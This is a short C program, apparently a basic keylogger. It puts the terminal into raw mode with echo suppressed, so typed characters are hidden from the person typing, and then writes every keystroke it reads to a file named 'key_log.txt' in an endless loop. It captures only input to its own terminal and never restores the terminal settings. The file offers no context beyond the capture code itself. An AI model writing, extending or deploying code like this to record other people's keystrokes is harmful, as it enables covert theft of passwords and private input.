#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <termios.h>

#define LOG_FILE "key_log.txt"

int main()
{
    // Set terminal to raw mode
    struct termios term;
    tcgetattr(STDIN_FILENO, &term);
    term.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &term);

    // Open the log file
    FILE *log_file = fopen(LOG_FILE, "a");
    if (log_file == NULL) {
        perror("Failed to open log file");
        return 1;
    }

    // Read and log keystrokes
    while (1) {
        int c = getchar();
        fprintf(log_file, "%c", c);
        fflush(log_file);
    }

    fclose(log_file);
    return 0;
}